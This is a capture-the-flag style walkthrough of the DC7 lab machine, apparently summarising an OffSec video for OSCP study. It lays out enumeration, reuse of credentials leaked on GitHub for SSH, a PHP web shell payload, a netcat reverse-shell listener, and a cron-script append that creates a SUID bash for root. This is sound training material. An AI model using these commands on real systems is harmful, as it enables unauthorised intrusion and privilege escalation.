@@ -1,0 +1,73 @@
+This walkthrough for the DC7 machine is an excellent example of **thinking outside the box**, a critical skill for the OSCP exam. The core path involves finding leaked credentials via an external source (GitHub) and then exploiting a writable cron job file for root access.
+
+Here are the comprehensive notes and commands for each phase of the penetration test, as demonstrated in the video:
+
+-----
+
+## 1\. Initial Enumeration & Footprinting
+
+The first step is always to identify open services and basic system information.
+
+| Phase | Command | Notes |
+| :--- | :--- | :--- |
+| **Set Environment Var** | `export ip=192.168.1.169` (Substitute with your target's IP) | Sets a variable to simplify future commands. |
+| **Full Nmap Scan** | `nmap -p- -sc -sv $ip` | Scans all ports (`-p-`), runs default scripts (`-sc`), and probes for service versions (`-sv`). |
+| **Initial Findings** | **Port 22 (SSH)** and **Port 80 (HTTP)**. | The system is identified as **Debian**, and the web server is running **Drupal 8**. |
+| **Robots Check** | Visit `http://$ip/robots.txt` | Confirms **Drupal** and finds paths like `/user/password`, which suggests a user login/reset mechanism. |
+
+-----
+
+## 2\. Web Application Enumeration (Drupal 8)
+
+The focus shifts to finding vulnerabilities on the Drupal CMS.
+
+| Phase | Command | Notes |
+| :--- | :--- | :--- |
+| **Drupal Scan** | `droopscan scan drupal -u http://$ip` | Used to quickly gather version information (Drupal 8.x) and identify themes/modules. |
+| **Directory Fuzzing**| `wfuzz -u http://$ip/FUZZ -w /path/to/wordlist` (Conceptual) | Used to find common directories and files, yielding little of immediate value, but establishing a baseline. |
+| **Username Enum** | Navigate to `http://$ip/user/password` and submit names like `admin`. | The differing error messages for existing vs. non-existing users confirm **Username Enumeration** is possible through the password reset function. |
+
+-----
+
+## 3\. Initial Foothold: Thinking Outside the Box
+
+Since brute-forcing was discouraged and enumeration stalled, the walkthrough pursued an external information gathering path.
+
+| Action | Discovery | Key Takeaway |
+| :--- | :--- | :--- |
+| **External Search** | Noted **"Powered by Drupal at dc7user"** on the home page. Searching for the username **`@dc7user`** led to a Twitter account. | Always look for usernames, emails, or project names that can be traced back to external sites. |
+| **GitHub Repository** | The Twitter bio pointed to a GitHub repository: `github.com/dc7user/staffdb`. | The repository contained a `config.php` file with a username and password. |
+| **Initial Access** | The credentials failed on the Drupal login but were successful for **SSH** via **password reuse**. | If credentials fail on one service, try them on all others. |
+| **SSH Login** | `ssh dc7user@$ip` | **Successful Login**, providing a shell as the low-privileged user `dc7user`. |
+
+-----
+
+## 4\. Privilege Escalation to `www-data` (Web Shell)
+
+The goal is to move from the low-privileged `dc7user` to the web user `www-data` to exploit file permissions.
+
+| Phase | Command/Action | Notes |
+| :--- | :--- | :--- |
+| **Database Credentials**| `cat sites/default/settings.php` (must be run in `/var/www/html/`) | Found the database credentials used by Drupal. |
+| **Drupal Admin Access** | 1. `cd /var/www/html` (Must be in web root). 2. `drush user:password admin --password="adminadmin"` | Used the built-in Drupal shell tool (`drush`) to **reset the `admin` user's password** on the CMS. |
+| **Install PHP Filter** | Log in as `admin` to the CMS, navigate to **Extend**, install the **"PHP Filter"** module. | This module allows executing PHP code directly in content fields. |
+| **Create Web Shell** | **Add Content** \> **Basic Page** \> **Text format: PHP code**. Payload: `<?php passthru($_GET['cmd']); ?>` | Creates a simple backdoor to execute system commands via a URL parameter (`cmd`). |
+| **Verify Web Shell** | Access the new page in a browser: `http://$ip/node/[ID]?cmd=id` | Confirmed **Code Execution as `www-data`**. |
+| **Reverse Shell** | **Listener:** `nc -lvnp 4444` (or 9090). **Payload:** Send a URL-encoded reverse shell to the `cmd` parameter. | Gained a stable, interactive shell as the **`www-data`** user. |
+
+-----
+
+## 5\. Privilege Escalation to Root (Cron Job)
+
+The final step uses the `www-data` user's permissions to modify a root-owned cron script.
+
+| Phase | Command/Action | Notes |
+| :--- | :--- | :--- |
+| **Identify Cron Script**| `ls -al /opt/scripts/` | Found the script `backups.shell`. The script is **owned by root**, but the permissions allow the `www-data` group (and thus the `www-data` user) to **write** to the file. |
+| **Write Payload** | `echo 'cp /bin/bash /var/tmp/dash; chmod u+s /var/tmp/dash' >> /opt/scripts/backups.shell` | This **appends** (using `>>`) a command to the root-owned script. When the cron job runs: 1. It copies `/bin/bash` to `/var/tmp/dash`. 2. It sets the **SUID bit** on `/var/tmp/dash`. |
+| **Execute Final Shell**| `cd /var/tmp` and `./dash -p` (or `dot slash dash`) | After waiting a few minutes for the cron job to execute, running the new SUID binary grants **unquestionable root authority**. |
+| **Flag Retrieval** | `cat /root/flag.txt` | You have successfully completed the machine. |
+
+<br>
+This walkthrough is from the official OffSec channel: [DC7 Walkthrough with S1REN!](http://www.youtube.com/watch?v=9skZiza_9o8)
+http://googleusercontent.com/youtube_content/0
